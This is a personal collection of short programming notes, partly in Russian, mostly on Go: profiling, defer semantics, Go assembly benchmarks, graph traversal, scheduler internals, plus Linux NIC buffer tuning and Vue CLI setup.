go get github.com/jfeliu007/goplantuml/parser
go get github.com/jfeliu007/goplantuml/cmd/goplantuml
cd $GOPATH/src/github.com/jfeliu007/goplantuml
go install ./...
// go install github.com/jfeliu007/goplantuml@latest
root@user:/home/user/project# /root/go/bin/goplantuml . > diagram.puml
root@user:/home/user/project# apt install plantuml
plantuml // it finds diagram.puml and convert it into png format
// see created file diagram.png
==================================================
Golang postulates
(tags: golang postulate)
---

https://bitfieldconsulting.com/golang/commandments

1. Use the standard testing library, not assertion-style test frameworks.
2. Don't use init functions
3. Write test function first for understanding what you'll need a way to inject that dependency
4. You need to test is not some function, but some behaviours
5. Instead, write zero-paperwork libraries, that can be invoked without prepare in a single line: game.Run(). Functional options are a good pattern.
6. Don't call functions like os.Exit, log.Fatal or (worst of all) panic in your package (that is, outside of the main function)
7. Use defer to close leakable resource
8. Use f(src io.Writer) instead f(src *os.File). Accept interfaces, return structs. To avoid type assertion.
9. Enforce good boundaries. Minimum contact with your code for users, hide others.
10. Always check errors.
11. Don't write a function that takes some interface{} value which can be one of seven concrete types. Instead, write seven functions, one for each concrete type.
12. Beware of the context.Value trap: don't store anything in this typeless black hole that could instead be passed as a parameter.
==================================================
Measure the frequency
(tags: measure frequency)
---

measure the frequency

ticker := time.NewTicker(time.Second)
start := time.Now()
var count int64 = 0
go func() {
  for {
    select {
    case <-ticker.C:
      cnt := atomic.LoadInt64(&count)
      freq := float64(cnt) / time.Since(start).Seconds()
      fmt.Printf("\r %f", freq)
    }
  }

}()
==================================================
Golang performance
(tags: golang performance)
---

https://chris124567.github.io/2021-06-21-go-performance/

cpufile, err := os.Create("cpu.pprof")
if err != nil {
  panic(err)
}
err = pprof.StartCPUProfile(cpufile)
if err != nil {
  panic(err)
}
defer cpufile.Close()
defer pprof.StopCPUProfile()

// go tool pprof cpu.pprof
// web

// циклы можно заменить для подсчета аллокаций в среднем:
// for i := 0; i < 100; i++ {
//    foo(rand.Int())
// }
fmt.Println("Allocs:", int(testing.AllocsPerRun(100, func() {
    foo(rand.Int())
})))

var bufPool = sync.Pool{
  New: func() interface{} {
    b := make([]byte, 256)
    return &b
  },
}
// get buffer from pool
bufptr := bufPool.Get().(*[]byte)
defer bufPool.Put(bufptr)
buf := *bufptr
// reset buf
buf = buf[:0]

// go build -gcflags='-m -m' .

1. Смотреть что можно вынести из цикла
2. Задавать длину капасити слайса при инициализации константой
3. Переиспользовать переменные
4. замена string(b) на *(*string)(unsafe.Pointer(&b))
==================================================
Godoc
(tags: godoc)
---

go get golang.org/x/tools/cmd/godoc
godoc -goroot .
// see http://localhost:6060
//whowing subderictories only
==================================================
Linux network interface buffer
(tags: linux network interface buffer)
---

https://ixnfo.com/izmenenie-tx-i-rx-buferov-setevyih-interfeysov-v-linux.html

// вывести имена сетевых интерфейсов
ifconfig -a
// посмотреть размеры буферов RX (прием) и TX (передача)
ethtool -g eth0
// меняем размеры буферов
ethtool -G eth0 rx 512 tx 512

// чтоб изменения сохранились надо
// добавить строку в /etc/network/interfaces:
post-up /sbin/ethtool -G eth0 rx 512 tx 512
// если не помогло то еще сюда /etc/rc.local
/sbin/ethtool -G eth0 rx 512 tx 512
==================================================
Golang defer
(tags: golang defer)
---

package main

import "fmt"

func main() {
  f(true)
}

func f(t bool)  {
  defer fmt.Println("defer 1", t) // выполнится с t = true, т.к. значение передается при объявлении
  defer fmt.Println("defer 2", t)
  defer func() {
    fmt.Println("defer 3", t) // выполнится с t = false, т.к. нет входящего параметра - значение передается при вызове
  }()
  defer func(t bool){
    fmt.Println("defer 4", t) // выполнится с t = true, т.к. есть входящий параметр - значение передается при объявлении
  }(t)
  t = false
  return
  defer fmt.Println("defer 5", t) // не выполнится, т.к. выше return - ф-ция не объявится
}

// defer 4 true
// defer 3 false
// defer 2 true
// defer 1 true
==================================================
Assembly in golang
(tags: golang assembly)
---

// main.go
package main

import "fmt"

func add(x,y int64) int64

func addInline(x, y int64) int64 {
  return x + y
}

//go:noinline
func addNoinline(x, y int64) int64 {
  return x + y
}

func main() {
  fmt.Println(add(2,3))
}

// add_amd64.s
TEXT ·add(SB),$0   // название пакета перед midpoint, символ midpoint (U+00b7) перед названием функции
MOVQ x+0(FP),BX    // 1-й аргумент копируется в BX
MOVQ x+8(FP),BP    // 2-й аргумент копируется в BP
ADDQ BP,BX         // в BX записывается сумма из BX+BP
MOVQ BX,ret+16(FP) // ВХ записывается в
RET


// обязательно символ midpoint (U+00b7) перед названием функции и пустая строка после RET

// main_test.go
package main

import "testing"

func Benchmark_add(b *testing.B) {
  for i := 0; i < b.N; i++ {
    add(2,3)
  }
}

func Benchmark_addInline(b *testing.B) {
  for i := 0; i < b.N; i++ {
    addInline(2,3)
  }
}

func Benchmark_addNoinline(b *testing.B) {
  for i := 0; i < b.N; i++ {
    addNoinline(2,3)
  }
}

// go test -bench=. -benchmem
Benchmark_add-4          306339064   3.835 ns/op   0 B/op  0 allocs/op
Benchmark_addInline-4    1000000000  0.2572 ns/op  0 B/op  0 allocs/op
Benchmark_addNoinline-4  302509377   3.661 ns/op   0 B/op  0 allocs/op
==================================================
Run func in direct time
(tags: run func direct time)
---

https://research.swtch.com/hwmm

package main

import (
  "fmt"
  "time"
)

func myFunc() {
  fmt.Printf("+ %v\n", time.Now())
}

func main() {
  callTime, _ := time.Parse("Jan 2, 2006 15:04:05 MST", "Jul 7, 2021 16:40:00 MSK")
  duration := callTime.Sub(time.Now())

  go func() {
    time.Sleep(duration)
    myFunc()
  }()

  // some work...
  time.Sleep(time.Hour * 24)
}

// other way
ctx, _ := context.WithDeadline(context.Background(), callTime)
go func(ctxIn context.Context) {
  <-ctxIn.Done()
  myFunc()
}(ctxIn)
==================================================
Graph BFS and DFS
(tags: graph bfs dfs)
---

package main

import (
  "fmt"
  "sync"
)

/*
     a1
   /  |  \
  b1  b2  b3
 /  \
c1  c2
*/

func main() {
  graph := NewGraph()
  a1 := &Node{name: "a1"}
  b1 := &Node{name: "b1"}
  b2 := &Node{name: "b2"}
  b3 := &Node{name: "b3"}
  c1 := &Node{name: "c1"}
  c2 := &Node{name: "c2"}

  graph.AddNode(a1)
  graph.AddNode(b1)
  graph.AddNode(b2)
  graph.AddNode(b3)
  graph.AddNode(c1)
  graph.AddNode(c2)

  graph.AddEdge(a1, b1)
  graph.AddEdge(a1, b2)
  graph.AddEdge(a1, b3)
  graph.AddEdge(b1, c1)
  graph.AddEdge(b1, c2)

  // добавить цикл в граф
  //graph.AddEdge(c2, b1)

  fmt.Println("BFS")
  graph.BFS(a1)
  fmt.Println("DFS")
  graph.DFS(a1)
}

type Graph struct {
  nodes []*Node
  edges map[Node][]*Node
  mutex sync.RWMutex
}

type Node struct {
  name string
}

func NewGraph() *Graph {
  return &Graph{
    nodes: make([]*Node, 0),
    edges: make(map[Node][]*Node),
  }
}

func (g *Graph) AddNode(node *Node) {
  g.mutex.Lock()
  g.nodes = append(g.nodes, node)
  g.mutex.Unlock()
}

func (g *Graph) AddEdge(start, end *Node) {
  g.mutex.Lock()
  g.edges[*start] = append(g.edges[*start], end)
  g.mutex.Unlock()
}

func (g *Graph) BFS(start *Node) {
  g.mutex.RLock()
  defer g.mutex.RUnlock()

  queue := []*Node{start}
  visited := make(map[Node]bool) // для цикличного графа
  for len(queue) > 0 {
    current := queue[0]
    fmt.Println(current)
    queue = queue[1:]
    for _, node := range g.edges[*current] {
      if !visited[*node] {
        queue = append(queue, node)
        visited[*node] = true
      }
    }
  }
}

func (g *Graph) DFS(start *Node) {
  g.mutex.RLock()
  defer g.mutex.RUnlock()

  visited := make(map[Node]bool) // для цикличного графа
  fmt.Println(start)
  g.recursive(start, visited)
}

func (g *Graph) recursive(node *Node, visited map[Node]bool)  {
  for _, n := range g.edges[*node] {
    if !visited[*n] {
      fmt.Println(n)
      visited[*n] = true
      g.recursive(n, visited)
    }
  }
}
==================================================
Scheduler
(tags: scheduler)
---

https://www.ardanlabs.com/blog/2018/08/scheduling-in-go-part1.html

// main.go
package main

func main() {
  example(make([]string, 2, 4), "hello", 10)
}

//go:noinline
func example(slice []string, str string, i int) {
  panic("Want stack trace")
}

// go build main.go
// go tool objdump -S -s "main.example" ./main
TEXT main.example(SB) /home/dim/projects/stepik/main.go
func example(slice []string, str string, i int) {
  0x45ed00  64488b0c25f8ffffff  MOVQ FS:0xfffffff8, CX
  0x45ed09  483b6110            CMPQ 0x10(CX), SP
  0x45ed0d  762b                JBE 0x45ed3a
  0x45ed0f  4883ec18            SUBQ $0x18, SP
  0x45ed13  48896c2410          MOVQ BP, 0x10(SP)
  0x45ed18  488d6c2410          LEAQ 0x10(SP), BP
        panic("Want stack trace")
  0x45ed1d  488d053c770000      LEAQ 0x773c(IP), AX
  0x45ed24  48890424            MOVQ AX, 0(SP)
  0x45ed28  488d0549b50200      LEAQ 0x2b549(IP), AX
  0x45ed2f  4889442408          MOVQ AX, 0x8(SP)
  0x45ed34  e8e7e3fcff          CALL runtime.gopanic(SB)
  0x45ed39  90                  NOPL
func example(slice []string, str string, i int) {
  0x45ed3a  e821afffff          CALL runtime.morestack_noctxt(SB)
  0x45ed3f  90                  NOPL
  0x45ed40  ebbe                JMP main.example(SB)


// Thread States
* Waiting: поток остановлен и ждет чего-то, чтобы продолжить. Это могло произойти по таким причинам, как ожидание оборудования (диск, сеть), операционной системы (системные вызовы) или вызовов синхронизации (атомарные, мьютексы). Эти типы задержек являются основной причиной плохой производительности.
* Runnable: потоку требуется время на ядре, чтобы он мог выполнять назначенные ему машинные инструкции. Если у вас много потоков, которым нужно время, им придется ждать дольше, чтобы получить время.
* Executing: поток был помещен в ядро ​​и выполняет свои машинные инструкции.
// Types Of Work
* CPU-Bound : это работа, которая никогда не создает ситуации, когда поток может быть переведен в состояние ожидания. Это работа, по которой постоянно ведутся расчеты. Поток, вычисляющий Pi до N-й цифры, будет привязан к процессору.
* IO-Bound : это работа, которая заставляет потоки переходить в состояния ожидания. Это работа, заключающаяся в запросе доступа к ресурсу по сети или выполнении системных вызовов операционной системы. Поток, которому требуется доступ к базе данных, будет привязан к вводу-выводу. Я бы включил события синхронизации (мьютексы, атомарные), которые заставляют поток ждать как часть этой категории.

Если вы работаете в Linux, Mac или Windows, вы работаете в ОС с вытесняющим планировщиком. Т.е он сам решает в определенное время какому потоку дать CPU

Физический акт перестановки потоков в ядре называется переключением контекста (1000 - 1500 наносекунд). Принимая во внимание, что оборудование должно иметь возможность разумно выполнять (в среднем) 12 инструкций за наносекунду на ядро, переключение контекста может стоить вам от 12k до 18k инструкций задержки.

Меньше потоков в состоянии Runnable означает меньше накладных расходов на планирование и больше времени, которое каждый поток получает с течением времени.

Если один поток на данном ядре вносит изменения в свою копию строки кэша, то с помощью аппаратной магии все другие копии той же строки кэша должны быть помечены как грязные. Когда поток пытается читать или записывать доступ к грязной строке кэша, для получения новой копии строки кэша требуется доступ к основной памяти (от ~ 100 до ~ 300 тактовых циклов). Это называется проблемой согласованности кеша

https://www.ardanlabs.com/blog/2018/08/scheduling-in-go-part2.html

// main.go
package main

import (
  "fmt"
  "runtime"
)

func main() {

    // NumCPU returns the number of logical
    // CPUs usable by the current process.
    fmt.Println(runtime.NumCPU())
}

NumCPU() = кол-во процессоров * кол-во ядер в процессоре * кол-во потоков на ядро (Hyper-Threading)

Каждому P назначается поток ОС («M»). Буква M означает машина. Этот поток по-прежнему управляется ОС, и ОС по-прежнему отвечает за размещение потока в ядре для выполнения

Каждой программе Go также дается начальная горутина («G»), которая является путем выполнения программы Go. Вы можете думать о горутинах как о потоках уровня приложения, и они во многом похожи на потоки ОС. Точно так же, как потоки ОС включаются и выключаются из контекста ядра, горутины включаются и выключаются из контекста M.

В планировщике Go есть две разные очереди выполнения: глобальная очередь выполнения (GRQ) и локальная очередь выполнения (LRQ). Каждому P дается LRQ, который управляет горутинами, назначенными для выполнения в контексте P. Эти горутины по очереди включаются и выключаются контекстом M, назначенным этому P. GRQ предназначен для горутин, которые пока еще не были назначены для P. Существует процесс перемещения горутин из GRQ в LRQ.

Текущая реализация планировщика Go ( >= 1.14) - это планировщик кооперативный с вытеснением. Кооперативный означает, что планировщику необходимы четко определенные события пользовательского пространства, которые происходят в безопасных точках кода, чтобы принимать решения по планированию. С вытеснением означает, что есть предел времени (forcePreemptNS = 10 мс), после которого G будет вытеснена с P.

wantAsyncPreempt — проверяем «хочет ли» G вытесняться, тут, например, проверится валидность текущего статуса горутины. isAsyncSafePoint — проверяем, можно ли вытеснить прямо сейчас. Самая интересная из проверок здесь — находится ли G в safe или unsafe point'е. Кроме того, мы должны быть уверены, что поток, на котором выполняется G, так же готов к вытеснению G. (https://habr.com/ru/post/502506/)

// Goroutine может находиться в одном из трех состояний:
* Waiting: означает, что горутина остановлена и ждет чего-то, чтобы продолжить. Это могло произойти по таким причинам, как ожидание операционной системы (системные вызовы) или вызовы синхронизации (атомарные операции и мьютексные операции). Эти типы задержек являются основной причиной плохой производительности.
* Runnable: означает, что горутине нужно время на M, чтобы она могла выполнить назначенные ей инструкции. Если у вас много горутин, которым нужно время, то горутины должны ждать дольше, чтобы получить время. Кроме того, индивидуальное количество времени, которое получает любая горутина, сокращается, поскольку все больше горутинов соревнуются за время.
* Executing: означает, что горутина была помещена на M (P?) и выполняет свои инструкции.

Планировщик начинает планировать, при:
* Использование ключевого слова go - Новая горутина создана, она дает планировщику возможность принять решение о планировании
* Вывоз мусора - Поскольку сборщик мусора работает с использованием собственного набора горутин, этим горутинам требуется время на M для запуска.
* Системные вызовы - Если горутина выполняет системный вызов, который заставляет горутину блокировать M, иногда планировщик может переключать контекст горутины с M и контекстно переключать новую горутину на тот же M. Однако иногда новый M является требуется для продолжения выполнения горутин, стоящих в очереди в P.
* Синхронизация и оркестровка - Если вызов атомарной, мьютексной или канальной операции приведет к блокировке горутины, планировщик может переключить контекст для запуска новой горутины.

Асинхронные системные вызовы. Сетевой опросчик (network poller) - kqueue (MacOS), epoll (Linux) или iocp (Windows). Помогает сохранить M доступным для выполнения других Goroutines в LRQ P без необходимости создавать новые M.
Синхронные системные вызовы. В этом случае сетевой опросчик не может быть использован, и Goroutine, выполняющий системный вызов, будет блокировать M. Одним из примеров системного вызова, который не может быть выполнен асинхронно, являются системные вызовы на основе файлов. Если вы используете CGO, могут быть другие ситуации, когда вызов функций C также заблокирует M. планировщик отсоединяет M1 от P с присоединенным блокирующим Goroutine-1. Затем планировщик вводит новый M2 для обслуживания P.

Work Stealing
у P1 больше нет горутин для выполнения. P1 должен проверить P2 на наличие горутин в его LRQ и взять половину того, что он найдет. Если там нет, то смотрит в GRQ

По сути, Go превратил работу IO / Blocking в работу, связанную с процессором на уровне ОС. Вот почему нам не нужно больше потоков, чем есть виртуальных ядер.
==================================================
Vue
(tags: vue)
---

// install node.js for npm - https://nodejs.org
npm install -g @vue/cli
vue create .
y -> Manually -> Chose,Babel,Router,Vuex -> 3.x -> y -> In package.json -> n

==================================================
Redis syntax
(tags: redis syntax)
---